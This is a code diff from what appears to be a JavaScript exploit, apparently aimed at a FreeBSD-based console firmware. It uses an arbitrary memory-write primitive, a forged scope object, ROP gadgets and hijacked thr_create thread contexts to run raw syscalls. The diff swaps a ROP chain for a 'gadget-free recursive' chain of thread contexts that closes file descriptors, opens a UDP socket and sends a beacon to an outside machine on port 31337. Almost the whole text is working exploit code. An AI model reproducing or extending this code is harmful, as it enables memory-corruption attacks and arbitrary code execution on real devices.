@@ -8276,85 +8276,40 @@ function _startWsShell(){
           /* EXIT_SLOT: every spawned child's ret lands here -> thr_exit */
           S.absWrite(A_EXIT,THR_EXIT);
           S.absWrite(A_WIT,0n);
-          /* childR (the parent's direct spawn, ctx AT THE SCOPE) spawns
-           * the chain and walks it. THE FD-INDEPENDENT WITNESS (v4): the
-           * close-range ladder makes the UDP socket's fd DETERMINISTIC:
-           * rungs 1-7: close(3)..close(9) (each child = one close syscall
-           * via the r10 tramp, RAX=6); rung 8: socket(2,2,0) -> the new
-           * UDP socket GETS THE LOWEST FREED FD = 3; rung 9: sendto(3,
-           * MSG, 32, 0, &dest, 16) -> the beacon lands at PC:31337/udp.
-           * No fd guessing, no reliance on pooled connections. */
-          var ctxAddr=[];
-          var ctxAddrPush=function(g){var ca=A_CTXG+BigInt(ctxAddr.length)*0x120n;ctxAddr.push(ca);buildCtx(ca,g);return ca;};
-          /* RUNG 0 - THE CLEAN-ARGS THR_CREATE (Track A, session 229h):
-           * the corpus's EXACT call shape: thr_create(ctx2, &WIT, 0) -
-           * RSI=a real writable buffer (NOT cfr), RDX=0 (flags=0). If
-           * the parent's fire errors on the stale RDX/RSI but THIS
-           * child-side call spawns, the errno source is CONFIRMED and
-           * the child chain works. ctx2 = the close-range witness ladder. */
-          var A_CTX2=LAD_BASE+0x2000n; /* the rung-0 child's own spawn ctx list */
-          /* ctx2's child = the close-range witness walker (reuse the same
-           * rung ctxs - a SECOND walker walking the SAME chain is fine,
-           * idempotent closes + socket + sendto). */
-          var ctxAddr2=[];
-          var ctxAddr2Push=function(g){var ca=A_CTX2+0x800n+BigInt(ctxAddr2.length)*0x120n;ctxAddr2.push(ca);buildCtx(ca,g);return ca;};
-          for(var cf=3;cf<=9;cf++){
-            ctxAddr2Push({rdi:BigInt(cf),rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT}); /* close(fd) */
+          /* THE 156d-MODEL GADGET-FREE RECURSIVE CTX LADDER (229j):
+           * each child's ctx.RIP IS its next instruction - THR_CREATE
+           * to spawn the next child, R10TRAMP for the syscall leaves.
+           * No chain, no gadget, no NX exposure. The ctx-linked-list:
+           * ctx[0] spawns ctx[1], ctx[1] spawns ctx[2]... the leaves
+           * do close(3..9), socket, sendto. Every child exits via
+           * RSP=A_EXIT (thr_exit). */
+          var A_CTXV=LAD_BASE+0x1000n;  /* the ctx vector: 13 slots */
+          var CTX_SIZE=0x120n;
+          var ctxAt=function(n){return A_CTXV+BigInt(n)*CTX_SIZE;};
+          /* rungs 0..6: the spawn cascade - each spawns the NEXT rung */
+          for(var rn=0;rn<7;rn++){
+            buildCtx(ctxAt(rn),{rdi:ctxAt(rn+1),rsi:A_WIT,rdx:0n,rcx:0n,r8:0n,r9:0n,rax:0n,rip:THR_CREATE,rsp:A_EXIT});
           }
-          ctxAddr2Push({rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});          /* socket(2,2,0) */
-          ctxAddr2Push({rdi:3n,rsi:A_MSG,rdx:32n,rcx:0n,r8:A_DEST,r9:16n,rax:133n,rip:R10TRAMP,rsp:A_EXIT}); /* sendto(3,...) */
-          /* rung-0's ctx: spawn the close-range walker's ctx[0], then walk
-           * ctxAddr2's chain itself - the walker function shape: */
-          buildCtx(A_CTX2,{rdi:ctxAddr2[0],rsi:A_WIT,rdx:0n,rcx:0n,r8:0n,r9:0n,rax:0n,rip:THR_CREATE,rsp:LAD_BASE+0x2C00n});
-          /* rung-0's chain (the pop-rdi ladder over ctxAddr2) */
-          var ch2=LAD_BASE+0x2C00n,qw2=0;
-          for(var r2=0;r2<ctxAddr2.length;r2++){
-            S.absWrite(ch2+BigInt((qw2++)*8),POP_RDI_RBP_RET);
-            S.absWrite(ch2+BigInt((qw2++)*8),ctxAddr2[r2]);
-            S.absWrite(ch2+BigInt((qw2++)*8),0n);
-            S.absWrite(ch2+BigInt((qw2++)*8),THR_CREATE);
-          }
-          S.absWrite(ch2+BigInt((qw2++)*8),POP_RDI_RBP_RET);
-          S.absWrite(ch2+BigInt((qw2++)*8),0n);
-          S.absWrite(ch2+BigInt((qw2++)*8),0n);
-          S.absWrite(ch2+BigInt((qw2++)*8),THR_EXIT);
-          /* the parent's chain: rung-0 ONLY (the clean-args thr_create
-           * child) - everything else is the child's own job. */
-          ctxAddr.push(A_CTX2);
-          /* ALSO the parent's own direct witness (keep the close-range
-           * ladder on the parent side as the parallel witness): */
-          for(var cf2=3;cf2<=9;cf2++){
-            ctxAddrPush({rdi:BigInt(cf2),rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT});
-          }
-          ctxAddrPush({rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});
-          ctxAddrPush({rdi:3n,rsi:A_MSG,rdx:32n,rcx:0n,r8:A_DEST,r9:16n,rax:133n,rip:R10TRAMP,rsp:A_EXIT});
-          buildCtx(A_CTXS,{rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});
-          if(A_CTXG+BigInt(ctxAddr.length)*0x120n>LAD_BASE+0x8000n){reply.err='ctx overflow';break;}
-          /* chainR: [POP_RDI_RBP_RET, CTX, 0, thr_create] per child, then
-           * [POP_RDI_RBP_RET, 0, 0, thr_exit]. */
-          var ch=A_CHAIN,qw=0;
-          for(var rj=0;rj<ctxAddr.length;rj++){
-            S.absWrite(ch+BigInt((qw++)*8),POP_RDI_RBP_RET);
-            S.absWrite(ch+BigInt((qw++)*8),ctxAddr[rj]);
-            S.absWrite(ch+BigInt((qw++)*8),0n);
-            S.absWrite(ch+BigInt((qw++)*8),THR_CREATE);
-          }
-          S.absWrite(ch+BigInt((qw++)*8),POP_RDI_RBP_RET);
-          S.absWrite(ch+BigInt((qw++)*8),0n);
-          S.absWrite(ch+BigInt((qw++)*8),0n);
-          S.absWrite(ch+BigInt((qw++)*8),THR_EXIT);
-          reply.ladder={tcpWave:[TF_LO,TF_HI],udpWave:[FD_LO,FD_HI],chainChildren:ctxAddr.length,firstWitness:'childR sendto fd '+TF_LO,chainQwords:qw,wit:'0x'+A_WIT.toString(16)};
-          F3('4 ladder built: childR=w1-fd'+TF_LO+' then '+(ctxAddr.length)+' chain children (w1-tcp='+(TNG-1)+' childS w2-udp='+NG+') qwords='+qw);
+          /* rungs 7..13: the syscall leaves */
+          buildCtx(ctxAt(7),{rdi:3n,rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT});   /* close(3) */
+          buildCtx(ctxAt(8),{rdi:4n,rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT});   /* close(4) */
+          buildCtx(ctxAt(9),{rdi:5n,rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT});   /* close(5) */
+          buildCtx(ctxAt(10),{rdi:6n,rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT});  /* close(6) */
+          buildCtx(ctxAt(11),{rdi:7n,rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT});  /* close(7) */
+          buildCtx(ctxAt(12),{rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT}); /* socket(2,2,0) -> fd=3 */
+          buildCtx(ctxAt(13),{rdi:3n,rsi:A_MSG,rdx:32n,rcx:0n,r8:A_DEST,r9:16n,rax:133n,rip:R10TRAMP,rsp:A_EXIT}); /* sendto(3,...) */
+          if(ctxAt(14)>LAD_BASE+0x8000n){reply.err='ctx overflow';break;}
+          reply.ladder={model:'156d-recursive',rungs:14,spawnRungs:7,leafRungs:7,wit:'0x'+A_WIT.toString(16)};
+          F3('4 ladder built: 14 ctxs, 7 spawn rungs + 7 leaf syscalls, 156d model');
 
-          /* ---- 5. THE PARENT CTX = THE SCOPE. childR = THE CHAIN
-           * WALKER: RIP=thr_create spawns ctx[0] (close(3)), then its
-           * ret walks the chain spawning every subsequent rung.
-           * RSI=&WIT (writable scratch; the 13.60 syscall writes NO tid
-           * for r8=0 but the arg must be sane), RDX=0. ---- */
+          /* ---- 5. THE PARENT CTX = THE SCOPE. childR = THE FIRST
+           * SPAWN RUNG: ctx.RIP=THR_CREATE, RDI=&ctx[1], RSI=&WIT,
+           * RDX=0. The 8-byte tid write goes to [A_WIT] (safe scratch,
+           * NOT the CallFrame). RSP=A_EXIT. ---- */
           for(var zc=0;zc<4;zc++)S.absWrite(S.fakeScope+BigInt(zc*8),0n);
-          var scG={rdi:ctxAddr[0],rsi:A_WIT,rdx:0n,rcx:0n,r8:0n,r9:0n,rax:0n,rip:THR_CREATE,rsp:A_CHAIN};
+          var scG={rdi:ctxAt(1),rsi:A_WIT,rdx:0n,rcx:0n,r8:0n,r9:0n,rax:0n,rip:THR_CREATE,rsp:A_EXIT};
           buildCtx(S.fakeScope,scG,true);
-          F3('5 scope ctx armed: childR=thr_create(ctx[0]) RSP=chain kernel-true gates');
+          F3('5 scope ctx armed: childR=ctx[0] rip=THR_CREATE -> ctx[1] rsp=EXIT 156d model');
 
           /* ---- 6. THE FIRE ---- */
           reply.fired=true;
